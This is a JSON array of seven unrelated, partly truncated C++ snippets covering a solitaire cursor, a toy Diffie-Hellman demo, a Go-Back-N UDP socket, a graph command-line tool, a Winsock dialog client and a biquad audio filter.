[
    "#include \"cursor.hpp\"\n\nCursor::Cursor(Board* boardPtr)\n{\n    this->board = boardPtr;\n\n    onNewGame();\n}\n\nvoid Cursor::onNewGame()\n{\n    this->horizCursorXIndex = 0;\n    this->lockedCursorPileIndex = this->horizCursorXIndex;\n    this->isLockedCursor = false;\n\n    // Reset pilecursors\n    for (int i = 0; i < COL_COUNT; i++)\n    {\n        this->pileCursors[i] = CursorPileInfo();\n    }\n}\n\nvoid Cursor::render()\n{\n    // Draw the horizontal cursors first\n    int baseX = HORIZ_CURSOR_XPOS[this->horizCursorXIndex];\n    CursorPileInfo& cursorPile = this->pileCursors[this->horizCursorXIndex];\n\n    if (this->horizCursorXIndex <= STACK_COUNT)\n    {\n        monoColorPrint(ColorPair::YELLOW, cursorPile.startingY - 1, baseX + 2, \"vvv\");\n        monoColorPrint(ColorPair::YELLOW, cursorPile.startingY + cursorPile.yHeight, baseX + 2, \"^^^\");\n    }\n    else\n    {\n        int yPos = cursorPile.startingY + 1 + cursorPile.currentCursorVerticalIndex * (cursorPile.yHeight + 1);\n        monoColorPrint(ColorPair::YELLOW, yPos - 2, baseX + 2, \"vvv\");\n        monoColorPrint(ColorPair::YELLOW, yPos + 2, baseX + 2, \"^^^\");\n    }\n\n    // Now draw vertical cursors\n    // Use the locked cursor if it is locked, hence reassign the baseX and cursorPile\n    int pileIndex = this->isLockedCursor ? this->lockedCursorPileIndex : this->horizCursorXIndex;\n    int yPos;\n    baseX = HORIZ_CURSOR_XPOS[pileIndex];\n    cursorPile = this->pileCursors[pileIndex];\n\n    if (cursorPile.currentCursorVerticalIndex == -1 && pileIndex <= STACK_COUNT)\n    {\n        // Pile is empty, don't draw cursor\n        return;\n    }\n    else if (pileIndex == 0) // Unused Pile\n    {   \n        yPos = cursorPile.startingY + 1 + 2 * cursorPile.currentCursorVerticalIndex;\n    }\n    else if (pileIndex <= STACK_COUNT) // Stacks\n    {\n        if (cursorPile.hasHiddenCard)\n        {\n            // 0 will be the hidden card, 1 will be the first visible card\n            if (cursorPile.currentCursorVerticalIndex == 0)\n            {\n                yPos = cursorPile.startingY + 1;\n            }\n            else\n            {\n                yPos = cursorPile.startingY + 2 + cursorPile.currentCursorVerticalIndex;\n            }\n        }\n        else\n        {\n            yPos = cursorPile.startingY + 1 + cursorPile.currentCursorVerticalIndex;\n        }\n    }\n    else // Foundations\n    {\n        yPos = cursorPile.startingY + 1 + (cursorPile.currentCursorVerticalIndex) * (cursorPile.yHeight + 1);\n    }\n    ColorPair color = this->isLockedCursor ? ColorPair::YELLOW : ColorPair::BLUE;\n    monoColorPrint(color, yPos, baseX, \">\");\n    monoColorPrint(color, yPos, baseX + 6, \"<\");\n}\n\n\nvoid Cursor::clampCursorPiles()\n{   \n    for (int i = 0; i < COL_COUNT; i++)\n    {\n        bool isFoundation = i >= 1 + STACK_COUNT;\n        int minVal = -1;\n        int maxVal = 0;\n        int yHeight = 3;\n\n        this->pileCursors[i].startingY = 2;\n\n        bool hasHiddenCard = false;\n        if (i == 0) // Unused pile\n        {\n            Card* nextCard = this->board->getNextUnusedCard();\n            hasHiddenCard = nextCard == nullptr; // | X | means no hidden card\n\n            Card* currCard = this->board->getCurrentUnusedCard();\n            if (currCard != nullptr) // 2 rows (X/? + Curr Card)\n            {\n                minVal = 0;\n                maxVal = 1;\n                yHeight = 5;\n            }\n            else if (nextCard != nullptr) // 1 row (?)\n            {\n                minVal = 0;\n                maxVal = 0;\n                yHeight = 3;\n            }\n            else // 0 rows, empty pile\n            {\n                minVal = -1;\n                maxVal = -1;\n                yHeight = EMPTY_PILE_CURSORPIILE_YHEIGHT;\n            }\n        }\n        else if (!isFoundation) // Stacks\n        {\n            int stackIndex = i - 1;\n            int stackLength = this->board->getStackLength(stackIndex);\n            int visibleCount = 0;\n\n            for (int j = 0; j < stackLength; j++)\n            {\n                if (this->board->getCardFromStack(stackIndex, j)->isFaceUp)\n                {\n                    visibleCount++;\n                }\n                else\n                {\n                    hasHiddenCard = true;\n                }\n            }\n            maxVal = (hasHiddenCard ? 1 : 0) + visibleCount - 1;\n            minVal = maxVal == -1 ? -1 : hasHiddenCard ? 1 : 0;\n            yHeight = maxVal == -1 ? EMPTY_PILE_CURSORPIILE_YHEIGHT : ((hasHiddenCard ? 2 : 0) + visibleCount + 2);\n        }\n        else\n        {\n            hasHiddenCard = false;\n            minVal = 0;\n            maxVal = 1;\n            yHeight = 3;\n        }\n        this->pileCursors[i].hasHiddenCard = hasHiddenCard;\n        // Here we try not to modify it unless it is over the max value, then we shift it back until it is within bounds\n        if (this->pileCursors[i].currentCursorVerticalIndex > maxVal)\n        {\n            this->pileCursors[i].currentCursorVerticalIndex = maxVal;\n        }\n        else if ",
    "/* This program calculates the Key for two persons\r\nusing the Diffie-Hellman Key exchange algorithm using C++ */\r\n#include <cmath>\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\n// Power function to return value of a ^ b mod P\r\nlong long int power(long long int a, long long int b,long long int P)\r\n{\r\n\tif (b == 1)\r\n\t\treturn a;\r\n\r\n\telse\r\n\t\treturn (((long long int)pow(a, b)) % P);\r\n}\r\n\r\n// Driver program\r\nint main()\r\n{\r\n\tlong long int P, G, x, a, y, b, ka, kb;\r\n\r\n\t// Both the persons will be agreed upon the\r\n\t// public keys G and P\r\n\tP = 23; // A prime number P is taken\r\n\tcout << \"The value of P : \" << P << endl;\r\n\r\n\tG = 9; // A primitive root for P, G is taken\r\n\tcout << \"The value of G : \" << G << endl;\r\n\r\n\t// Alice will choose the private key a\r\n\ta = 5; // a is the chosen private key\r\n\tcout << \"The private key a for Alice : \" << a << endl;\r\n\r\n\tx = power(G, a, P); // gets the generated key\r\n\r\n\t// Bob will choose the private key b\r\n\tb = 7; // b is the chosen private key\r\n\tcout << \"The private key b for Bob : \" << b << endl;\r\n\r\n\ty = power(G, b, P); // gets the generated key\r\n\r\n\t// Generating the secret key after the exchange\r\n\t// of keys\r\n\tka = power(y, a, P); // Secret key for Alice\r\n\tkb = power(x, b, P); // Secret key for Bob\r\n\tcout << \"Secret key for the Alice is : \" << ka << endl;\r\n\r\n\tcout << \"Secret key for the Bob is : \" << kb << endl;\r\n\r\n\treturn 0;\r\n}\r\n// This code is contributed by Pranay Arora\r\n",
    "#include \"cs/system/input.hpp\"\n#include \"cs/network/dispatch.hpp\"\n#include \"cs/hint.hpp\"\n#include \"cs/reader.hpp\"\n#include \"cs/core/parser.hpp\"\n#include \"cs/network/server.hpp\"\n//#include \"cs/system/open.hpp\"\n\n#include <unistd.h>\n#include <fcntl.h>\n\n\n// -- public lifecycle --------------------------------------------------------\n\n/* default constructor */\ncs::input::input(void)\n: _stdin{STDIN_FILENO},\n  _parser{}, _issues{},\n  _term{} {\n\n\tif (::isatty(STDIN_FILENO)) {\n\t\tcs::hint::error(\"no data available\");\n\t\tcs::dispatch::stop();\n\t}\n\n\t//\n\t//char buff[1024];\n\t//// get the calling process ID\n\t//const pid_t pid = ::getpid();\n\t//// get the current process session ID\n\t//const pid_t sid = ::getsid(pid);\n\t//\n\t//const char* tty = ::ttyname(STDOUT_FILENO);\n\t//const char* tid = ::ctermid(buff);\n\t//\n\t//std::cout << \"tty: \" << tty << std::endl;\n\t//std::cout << \"tid: \" << tid << std::endl;\n\t//\n\t//\n\t//// open original terminal stdin (not redirected) (macos only)\n\t//auto ___ctid = cs::open(\"/dev/tty\", O_RDONLY | O_NOFOLLOW);\n\t////auto ___ctid = cs::open(tid, O_RDONLY | O_NOFOLLOW);\n\t//auto ___tty = cs::open(tty, O_RDONLY);\n\t//\n\t//\n\t//if (sid != ::tcgetsid(___ctid))\n\t//\tthrow cs::runtime_error(\"tid is not the controlling terminal\");\n\t//else\n\t//\tcs::hint::info(\"tid is the controlling terminal\");\n\t//\n\t//if (sid != ::tcgetsid(___tty))\n\t//\tthrow cs::runtime_error(\"tty is not the controlling terminal\");\n\t//else\n\t//\tcs::hint::info(\"tty is the controlling terminal\");\n\t//\n\t//_stdin = cs::move(___ctid);\n\t//\n\t//\n\t//std::cout << \"stdin: \" << _stdin << std::endl;\n\t//\n\t//\n\t//// set non-blocking\n\t////auto flags = ::fcntl(_stdin , F_GETFL, 0);\n\t////\n\t////if (flags < 0)\n\t////\tthrow cs::runtime_error(\"fcntl\");\n\t////\n\t////flags |= O_NONBLOCK;\n\t////\n\t////if (::fcntl(_stdin, F_SETFL, flags) < 0)\n\t////\tthrow cs::runtime_error(\"fcntl\");\n\t//\n\t//// dup stdin\n\t////close(STDIN_FILENO);\n\t////dup2(_stdin, STDIN_FILENO);\n\t//\n\t//\n\t//// set raw mode\n\t//struct termios raw;\n\t//\n\t//if (::tcgetattr(_stdin, &_term) < 0)\n\t//\tthrow cs::runtime_error(\"tcgetattr\");\n\t//\n\t//raw = _term;\n\t//\n\t//raw.c_lflag &= static_cast<tcflag_t>(~(ECHO | ICANON));\n\t//// min number of bytes of input needed before read can return\n\t//raw.c_cc[VMIN] = 1;\n\t//\n\t//if (::tcsetattr(_stdin, TCSAFLUSH, &raw) < 0)\n\t//\tthrow cs::runtime_error(\"tcsetattr\");\n\n}\n\n/* destructor */\ncs::input::~input(void) noexcept {\n\n\t// restore terminal attributes\n\t//if (::tcsetattr(_stdin, TCSAFLUSH, &_term) < 0)\n\t//\tcs::hint::error(\"tcsetattr\");\n}\n\n// -- public overriden methods ------------------------------------------------\n\n/* read */\nauto cs::input::read(void) -> void {\n\n\tcs::reader<1024> ___rd;\n\n\t___rd.read(_stdin);\n\tstd::cout << \"size: \" << ___rd.size() << std::endl;\n\n\tif (___rd.eof()) {\n\t\tcs::hint::info(\"eof\");\n\t\tcs::dispatch::stop();\n\t\t//\n\t\t//if (_issues.empty()) {\n\t\t//\tcs::hint::info(\"no issues found\");\n\t\t//\tcs::dispatch::stop();\n\t\t//\treturn;\n\t\t//}\n\t\t//\n\t\t//for (auto& iss : _issues)\n\t\t//\tiss.print();\n\t\t//\n\t\t//cs::dispatch::disable(*this);\n\t\t//cs::dispatch::add(cs::make_unique<cs::server>());\n\t\treturn;\n\t}\n\n\t//_parser.parse(___rd, _issues);\n\n\n\t//// buffer\n\t//char ___ch;\n\t//\n\t//// read\n\t//auto n = ::read(_stdin, &___ch, 1U);\n\t//\n\t//if (n < 0)\n\t//\tthrow cs::runtime_error(\"error while reading from stdin\");\n\t//\n\t//switch (___ch) {\n\t//\n\t//\tcase 'q':\n\t//\t\t// fallthrough\n\t//\tcase '\\x1b':\n\t//\t\tcs::dispatch::stop();\n\t//\t\tbreak;\n\t//\tdefault:\n\t//\t\tbreak;\n\t//}\n}\n\n/* send */\nauto cs::input::send(void) -> void {\n\n}\n\n/* descriptor */\nauto cs::input::descriptor(void) const noexcept -> int {\n\treturn STDIN_FILENO;\n}\n",
    "//\n// Created by no3core on 2024/4/17.\n//\n\n#include <iostream>\n#include \"GBNSocket.h\"\n#include \"util/Timestamp.h\"\n\n\nGBNSocket::GBNSocket(\n        uint16_t local_port\n): sfd_(local_port)\n{\n    /*\n     * here the socket only support one connect, so peer addr and port:\n     * when the socket create, it is listening\n     *      peer address and port will be set when pkg arrived\n     * when the socket sent package actively, use SetAddress to sent\n     */\n\n    local_port_= local_port;\n    peer_addr_.sin_port =0;\n    peer_addr_.sin_addr.s_addr=0;\n\n    FireEventLoop(0,0);\n\n}\n\nGBNSocket::~GBNSocket() {\n    Close();\n    eventthread_.join();\n}\n\nvoid GBNSocket::SentPkgLog(const GBNPDU& pkg){\n    // adding logging here: sending log\n    if(pkg.ackf_){\n        fprintf(stderr,\"[%s], ack_to_send=%d\\n\",formatTime().c_str(),pkg.GetNum());\n    }else{\n        fprintf(stderr,\"[%s], pdu_to_send=%d,status=%s,ackedNo=%s,isfin=%s\\n\",\n                formatTime().c_str(),\n                pkg.GetNum(),\n                GBNPDU::statemap_[pkg.state_].c_str(),\n                (connection_.GetAckedPlus1()==0)?\n                \"(null)\":\n                std::to_string(connection_.GetAckedPlus1()-1).c_str(),\n                (pkg.Fin())?\"true\":\"false\"\n        );\n    }\n}\n\nvoid GBNSocket::RecvPkgLog(const GBNPDU &pkg) {\n    // logic duplicate to PkgReceive\n    const char* status;\n    if(pkg.malformed_){\n        status = \"DataErr\";\n        fprintf(stderr,\"[%s], status=%s\\n\",formatTime().c_str(),status);\n    } else if(pkg.ackf_){\n        fprintf(stderr,\"[%s], ack_to_recv=%d,status=OK\\n\",formatTime().c_str(),pkg.GetNum());\n    } else {\n        if(pkg.GetNum()!=connection_.GetExpectAck())\n            status = \"NoErr\";\n        else if(connection_.GetRecvStream().IsEofed())\n            status = \"AfterEof\";\n        else\n            status = \"OK\";\n\n        fprintf(stderr,\"[%s], pdu_exp=%d,pdu_recv=%d,status=%s,isfin=%s\\n\",\n                formatTime().c_str(),\n                connection_.GetExpectAck(),\n                pkg.GetNum(),\n                status,\n                (pkg.Fin())?\"true\":\"false\"\n        );\n    }\n}\nstatic const char*n2hex = \"0123456789ABCDEF\";\n\nconstexpr int BUFFER_SIZE = 65507 ; // max udp package\nvoid GBNSocket::FrameReceived(int socketfd) {\n\n    char buffer[BUFFER_SIZE];\n    sockaddr_in clientAddr{};\n    socklen_t   addrLen = sizeof(clientAddr);\n    ssize_t bytesRead =\n            recvfrom(\n                socketfd,\n                buffer,\n                BUFFER_SIZE,\n                0,\n                reinterpret_cast<sockaddr*>(&clientAddr),\n                &addrLen\n            );\n\n    auto && temp_pkg =GBNPDU(buffer,bytesRead);\n\n    RecvPkgLog(temp_pkg);\n\n    connection_.PkgReceived(temp_pkg);\n\n    // wake up possible socket reader\n    // notify the socket reader\n    if(!connection_.GetRecvStream().IsEmpty())\n    {\n        std::unique_lock<std::mutex> lk(read_mt_);\n        if(rstate_==WCHGE){\n            rstate_ = RETRY;\n            read_cv_.notify_one();\n        }\n    }\n\n    if(!connection_.IsSenderFull()){\n        std::unique_lock<std::mutex> lk(write_mt_);\n        if(wstate_==WCHGE){\n            wstate_ = RETRY;\n            write_cv_.notify_one();\n        }\n    }\n\n    if(peer_addr_.sin_port==0)\n        peer_addr_ = clientAddr;\n}\n\n\n\nvoid GBNSocket::FrameSent(int eventfd,uint16_t errorrate,uint16_t lostrate) {\n    static std::random_device rd;\n    static std::mt19937 gen(rd());\n\n    double errorrate_p = errorrate/100.0;\n    double lostrate_p  = lostrate/100.0;\n    std::discrete_distribution<> err_distrib({ 1-errorrate_p, errorrate_p });\n    std::discrete_distribution<> los_distrib({ 1-lostrate_p,  lostrate_p });\n\n    if(peer_addr_.sin_port==0)\n        throw std::runtime_error(\"GBNSocket: set peer address first!\");\n    int sentnum;\n    // temp no checking\n    read(eventfd,&sentnum,sizeof(sentnum));\n\n//    fprintf(stderr,\"frame sent, there is %d pkg wait to sent\\n\",sentnum);\n\n    int sockfd = sfd_.GetFd();\n    auto & sentq = connection_.GetWaitToSent();\n    for (int i = 0; i < sentnum && !sentq.empty(); ++i) {\n        auto &pkg = sentq.front();\n\n        SentPkgLog(pkg);\n\n        auto &&serial = pkg.Serialize();\n\n        bool islast_ack_pkg = pkg.ackf_ && (pkg.GetNum()==connection_.GetExpectAck()-1) && connection_.IsPeerEofed();\n\n        if(!los_distrib(gen) || pkg.Fin() || islast_ack_pkg){\n            if(err_distrib(gen) && !pkg.Fin() && !islast_ack_pkg){\n                std::uniform_int_distribution<> uni_distrib(0,serial.size());\n                serial[uni_distrib(gen)] ^= 0xFF; // flip the bytes\n            }\n\n            // sent successfully\n            ssize_t bytesSent = sendto(\n                    sockfd,\n                    serial.c_str(),\n                    serial.size(),\n                    0,\n                    reinterpret_cast<sockaddr*>(&peer_addr_),\n                    sizeof(peer_addr_)\n            );\n            if(bytesSent<0){\n                char *p = strerror(errno);\n                std::cout << peer_addr_.s",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <unordered_map>\n#include <fstream>\n#include <filesystem>\n#include <sstream>\n#include <queue>\n\n\n#define VERSION \"1.1.0\"\n\n#if defined(_WIN32) || defined(_WIN64) || \\\n    defined(__WIN32__) || defined(__TOS_WIN__) || \\\n    defined(__WINDOWS__)\n#    define ENV \"windows\"\n#    define Windows\n#elif defined(linux) || defined(__linux) || \\\n    defined(__linux__) || defined(__gnu_linux__)\n#    define ENV \"linux\"\n#elif defined(macintosh) || defined(Macintosh) || \\\n    (defined(__APPLE__) && defined(__MACH__))\n#    define ENV \"macos\"\n#else\n#    error Unsupported OS\n#endif\n\n#if defined(__x86_64__) || defined(_M_X64)\n#define ARC \"x86_64\"\n#elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)\n#define ARC \"x86_32\"\n#else\n#define ARC \"arm\"\n#endif\n\n\nstruct Node;\n\nstruct Edge {\n    size_t indx_to;\n    size_t indx_from;\n    float cost;\n};\n\nstruct Node {\n    std::string name;\n    std::vector<Edge> edge;\n};\n\n\ninline int convertToInt(const std::string& str) {\n    return *(reinterpret_cast<const int*>(str.c_str()));\n}\n\ninline void interupted() {\n    std::cout << \"interrupted\\n\";\n}\n\n\nstd::unordered_map<std::string, size_t> name_map;\nstd::vector<Node> graph;\nsize_t nod_origin_index = 0;\nstd::string inp = \"\";\n\nbool debug_flag = false;\nbool argument_flag = false;\n\n\nstd::queue<std::string> arg_input_queue;\n\n\nvoid inputNodeName() {\n    if (argument_flag) {\n        inp = arg_input_queue.front();\n        arg_input_queue.pop();\n    } else {\n        std::cout << \"name: \";\n        std::getline(std::cin >> std::ws, inp);\n    }\n}\n\n\nvoid fNewPoint() {\n    inputNodeName();\n\n    Node nd;\n    nd.name = inp;\n    name_map.insert(std::make_pair(inp, graph.size()));\n\n    graph.push_back(nd);\n}\n\n\nsize_t getNode() {\n    auto iter = name_map.begin();\n\n    if (!argument_flag) {\n        auto not_inter = true;\n        do {\n            inputNodeName();\n\n            if (inp.empty())\n                not_inter = false;\n            else\n                iter = name_map.find(inp);\n\n        } while (not_inter && (iter == name_map.end() || iter->second == nod_origin_index));\n\n        return not_inter\n            ? iter->second\n            : -1;\n    } else {\n        inputNodeName();\n        iter = name_map.find(inp);\n\n        return !(iter == name_map.end() || iter->second == nod_origin_index)\n            ? iter->second\n            : -1;\n    }\n}\n\n\nvoid embedEdge(Edge& edg) {\n    if (argument_flag) {\n        edg.cost = std::stof(arg_input_queue.front());\n        arg_input_queue.pop();\n    } else {\n        std::cout << \"cost: \";\n        std::cin >> edg.cost;\n    }\n\n    graph[edg.indx_from].edge.push_back(edg);\n    graph[edg.indx_to].edge.push_back(edg);\n}\n\nvoid giveChoiceUseNameAsIndex() {\n    if (argument_flag) {\n        inp = (arg_input_queue.front()[0] == 'n') ? \"Y\" : \"n\";\n    } else {\n        std::cout << \"use name as index(Y/n): \";\n        std::cin >> inp;\n    }\n}\n\nvoid fNewEdge() {\n    if (graph.size() < 2) return;\n\n    giveChoiceUseNameAsIndex();\n\n    if (inp[0] == 'Y') {\n        Edge edg = { 0 };\n        edg.indx_from = nod_origin_index;\n\n        if ((edg.indx_to = getNode()) == -1) { interupted(); return; }\n\n        embedEdge(edg);\n    } else if (inp[0] == 'n') {\n        Edge edg = { 0 };\n        edg.indx_from = nod_origin_index;\n\n        if (argument_flag) {\n            edg.indx_to = std::stoi(arg_input_queue.front());\n            arg_input_queue.pop();\n\n            if (edg.indx_to >= graph.size() && edg.indx_to == nod_origin_index) {\n                std::cout << \"index is out of range\\n\";\n                exit(1);\n            }\n        }\n        else\n            while ((std::cin >> edg.indx_to, edg.indx_to) >= graph.size() && edg.indx_to == nod_origin_index);\n\n        embedEdge(edg);\n    }\n}\n\n\nvoid fList() {\n    if (graph.empty()) return;\n\n    auto& cur = graph[nod_origin_index];\n\n    size_t nod_to;\n\n    std::cout << cur.name << \":\\n\";\n    for (size_t i = 0; i < cur.edge.size(); i++) {\n        nod_to = ((cur.edge[i].indx_from == nod_origin_index)\n            ? cur.edge[i].indx_to\n            : cur.edge[i].indx_from);\n\n        std::cout << '\\t';\n\n        if (nod_to >= graph.size()) std::cout << \"invl \" << nod_to;\n        else std::cout << graph[nod_to].name;\n\n        std::cout << \" -> \" << cur.edge[i].cost << '\\n';\n    }\n\n}\n\n\nvoid fListAll() {\n    size_t old_origin = nod_origin_index;\n    std::cout << \"Size: \" << graph.size() << \" nodes\\n\";\n    for (size_t i = 0; i < graph.size(); i++) {\n        nod_origin_index = i;\n        fList();\n    }\n}\n\n\nvoid fSetOrigin() {\n    if (graph.size() == 1) nod_origin_index = 0;\n    if (graph.size() < 2) return;\n\n    giveChoiceUseNameAsIndex();\n\n    if (inp[0] == 'Y') {\n        if ((nod_origin_index = getNode()) == -1) {\n            interupted();\n            nod_origin_index = 0;\n            return;\n        }\n    } else if (inp[0] == 'n') {\n        if (argument_flag) {\n            nod_origin_index = std::stoi(arg_input_queue.front());\n     ",
    "\ufeff#include <iostream>\n#include <string>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n#include \"resource.h\"\n#include <tchar.h>\n#include <CommCtrl.h>\n#pragma comment(lib, \"Ws2_32.lib\")\n\n\nSOCKET _socket;\n\nBOOL CALLBACK DialogProc(HWND hwndDlg, UINT message, WPARAM wParam, LPARAM lParam) {\n    switch (message) {\n    case WM_INITDIALOG:\n        return TRUE;\n    case WM_COMMAND:\n        switch (LOWORD(wParam)) {\n        case IDC_BUTTON1: {\n            const int MAXSTRLEN = 255;\n            char buf[MAXSTRLEN];\n            char str[MAXSTRLEN];\n\n            // get text from idc_edit1\n            GetDlgItemText(hwndDlg, IDC_EDIT1, str, MAXSTRLEN);\n\n            // server connect\n            WSADATA wsaData;\n            if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {\n                MessageBox(NULL, \"WSAStartup failed\", \"Error\", MB_OK | MB_ICONERROR);\n                return TRUE;\n            }\n\n            _socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n            if (_socket == INVALID_SOCKET) {\n                MessageBox(NULL, \"Socket creation failed\", \"Error\", MB_OK | MB_ICONERROR);\n                WSACleanup();\n                return TRUE;\n            }\n\n            sockaddr_in addr;\n            addr.sin_family = AF_INET;\n            inet_pton(AF_INET, \"127.0.0.1\", &addr.sin_addr);\n            addr.sin_port = htons(20000);\n\n            if (connect(_socket, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {\n                MessageBox(NULL, \"Connection failed\", \"Error\", MB_OK | MB_ICONERROR);\n                closesocket(_socket);\n                WSACleanup();\n                return TRUE;\n            }\n\n            // send msg to server\n            send(_socket, str, strlen(str), 0);\n\n            // get server answer\n            int i = recv(_socket, buf, MAXSTRLEN, 0);\n            buf[i] = '\\0';\n\n            MessageBox(NULL, buf, \"Message from Server\", MB_OK | MB_ICONINFORMATION);\n\n            // close socket and clean winsock\n            closesocket(_socket);\n            WSACleanup();\n\n            return TRUE;\n        }\n        }\n        break;\n    case WM_CLOSE:\n        EndDialog(hwndDlg, 0);\n        break;\n    }\n    return FALSE;\n}\n\nint WINAPI _tWinMain(HINSTANCE hInst, HINSTANCE hPrev, LPTSTR lpszCmdLine, int nCmdShow) {\n    return DialogBox(hInst, MAKEINTRESOURCE(IDD_DIALOG1), NULL, (DLGPROC)DialogProc);\n}\n",
    "#define _USE_MATH_DEFINES\n#include <cmath>\n#include \"Biquad2.h\"\n\nnamespace AudioLib\n{\n\tBiquad2::Biquad2() \n\t{\n\t\tClearBuffers();\n\t}\n\n\tBiquad2::Biquad2(FilterType filterType, float samplerate)\n\t{\n\t\tType = filterType;\n\t\tSetSamplerate(samplerate);\n\n\t\tSetGainDb(0.0);\n\t\tFrequency = samplerate / 4;\n\t\tSetQ(0.5);\n\t\tClearBuffers();\n\t}\n\n\tBiquad2::~Biquad2() \n\t{\n\n\t}\n\n\n\tfloat Biquad2::GetSamplerate() \n\t{\n\t\treturn samplerate;\n\t}\n\n\tvoid Biquad2::SetSamplerate(float value)\n\t{\n\t\tsamplerate = value; \n\t\tUpdate();\n\t}\n\n\tfloat Biquad2::GetGainDb() \n\t{\n\t\treturn std::log10(gain) * 20;\n\t}\n\n\tvoid Biquad2::SetGainDb(float value) \n\t{\n\t\tSetGain(std::pow(10, value / 20));\n\t}\n\n\tfloat Biquad2::GetGain() \n\t{\n\t\treturn gain;\n\t}\n\n\tvoid Biquad2::SetGain(float value) \n\t{\n\t\tif (value == 0)\n\t\t\tvalue = 0.001; // -60dB\n\t\t\n\t\tgain = value;\n\t}\n\n\tfloat Biquad2::GetQ()\n\t{\n\t\treturn _q;\n\t}\n\n\tvoid Biquad2::SetQ(float value) \n\t{\n\t\tif (value == 0)\n\t\t\tvalue = 1e-12;\n\t\t_q = value;\n\t}\n\n\tvector<float> Biquad2::GetA() \n\t{\n\t\treturn vector<float>({ 1, a1, a2 });\n\t}\n\n\tvector<float> Biquad2::GetB()\n\t{\n\t\treturn vector<float>({ b0, b1, b2 });\n\t}\n\n\n\tvoid Biquad2::Update()\n\t{\n\t\tfloat omega = 2 * M_PI * Frequency / samplerate;\n\t\tfloat sinOmega = std::sin(omega);\n\t\tfloat cosOmega = std::cos(omega);\n\n\t\tfloat sqrtGain = 0.0;\n\t\tfloat alpha = 0.0;\n\n\t\tif (Type == FilterType::LowShelf || Type == FilterType::HighShelf)\n\t\t{\n\t\t\talpha = sinOmega / 2 * std::sqrt((gain + 1 / gain) * (1 / Slope - 1) + 2);\n\t\t\tsqrtGain = std::sqrt(gain);\n\t\t}\n\t\telse\n\t\t{\n\t\t\talpha = sinOmega / (2 * _q);\n\t\t}\n\n\t\tswitch (Type)\n\t\t{\n\t\tcase FilterType::LowPass:\n\t\t\tb0 = (1 - cosOmega) / 2;\n\t\t\tb1 = 1 - cosOmega;\n\t\t\tb2 = (1 - cosOmega) / 2;\n\t\t\ta0 = 1 + alpha;\n\t\t\ta1 = -2 * cosOmega;\n\t\t\ta2 = 1 - alpha;\n\t\t\tbreak;\n\t\tcase FilterType::HighPass:\n\t\t\tb0 = (1 + cosOmega) / 2;\n\t\t\tb1 = -(1 + cosOmega);\n\t\t\tb2 = (1 + cosOmega) / 2;\n\t\t\ta0 = 1 + alpha;\n\t\t\ta1 = -2 * cosOmega;\n\t\t\ta2 = 1 - alpha;\n\t\t\tbreak;\n\t\tcase FilterType::BandPass:\n\t\t\tb0 = alpha;\n\t\t\tb1 = 0;\n\t\t\tb2 = -alpha;\n\t\t\ta0 = 1 + alpha;\n\t\t\ta1 = -2 * cosOmega;\n\t\t\ta2 = 1 - alpha;\n\t\t\tbreak;\n\t\tcase FilterType::Notch:\n\t\t\tb0 = 1;\n\t\t\tb1 = -2 * cosOmega;\n\t\t\tb2 = 1;\n\t\t\ta0 = 1 + alpha;\n\t\t\ta1 = -2 * cosOmega;\n\t\t\ta2 = 1 - alpha;\n\t\t\tbreak;\n\t\tcase FilterType::Peak:\n\t\t\tb0 = 1 + (alpha * gain);\n\t\t\tb1 = -2 * cosOmega;\n\t\t\tb2 = 1 - (alpha * gain);\n\t\t\ta0 = 1 + (alpha / gain);\n\t\t\ta1 = -2 * cosOmega;\n\t\t\ta2 = 1 - (alpha / gain);\n\t\t\tbreak;\n\t\tcase FilterType::LowShelf:\n\t\t\tb0 = gain * ((gain + 1) - (gain - 1) * cosOmega + 2 * sqrtGain * alpha);\n\t\t\tb1 = 2 * gain * ((gain - 1) - (gain + 1) * cosOmega);\n\t\t\tb2 = gain * ((gain + 1) - (gain - 1) * cosOmega - 2 * sqrtGain * alpha);\n\t\t\ta0 = (gain + 1) + (gain - 1) * cosOmega + 2 * sqrtGain * alpha;\n\t\t\ta1 = -2 * ((gain - 1) + (gain + 1) * cosOmega);\n\t\t\ta2 = (gain + 1) + (gain - 1) * cosOmega - 2 * sqrtGain * alpha;\n\t\t\tbreak;\n\t\tcase FilterType::HighShelf:\n\t\t\tb0 = gain * ((gain + 1) + (gain - 1) * cosOmega + 2 * sqrtGain * alpha);\n\t\t\tb1 = -2 * gain * ((gain - 1) + (gain + 1) * cosOmega);\n\t\t\tb2 = gain * ((gain + 1) + (gain - 1) * cosOmega - 2 * sqrtGain * alpha);\n\t\t\ta0 = (gain + 1) - (gain - 1) * cosOmega + 2 * sqrtGain * alpha;\n\t\t\ta1 = 2 * ((gain - 1) - (gain + 1) * cosOmega);\n\t\t\ta2 = (gain + 1) - (gain - 1) * cosOmega - 2 * sqrtGain * alpha;\n\t\t\tbreak;\n\t\t}\n\n\t\tfloat g = 1 / a0;\n\n\t\tb0 = b0 * g;\n\t\tb1 = b1 * g;\n\t\tb2 = b2 * g;\n\t\ta1 = a1 * g;\n\t\ta2 = a2 * g;\n\t}\n\n\tfloat Biquad2::GetResponse(float freq)\n\t{\n\t\tfloat phi = std::pow((std::sin(2 * M_PI * freq / (2.0 * samplerate))), 2);\n\t\treturn (std::pow(b0 + b1 + b2, 2.0) - 4.0 * (b0 * b1 + 4.0 * b0 * b2 + b1 * b2) * phi + 16.0 * b0 * b2 * phi * phi) / (std::pow(1.0 + a1 + a2, 2.0) - 4.0 * (a1 + 4.0 * a2 + a1 * a2) * phi + 16.0 * a2 * phi * phi);\n\t}\n\n\tvoid Biquad2::ClearBuffers() \n\t{\n\t\ty = 0;\n\t\tx2 = 0;\n\t\ty2 = 0;\n\t\tx1 = 0;\n\t\ty1 = 0;\n\t}\n\n}",
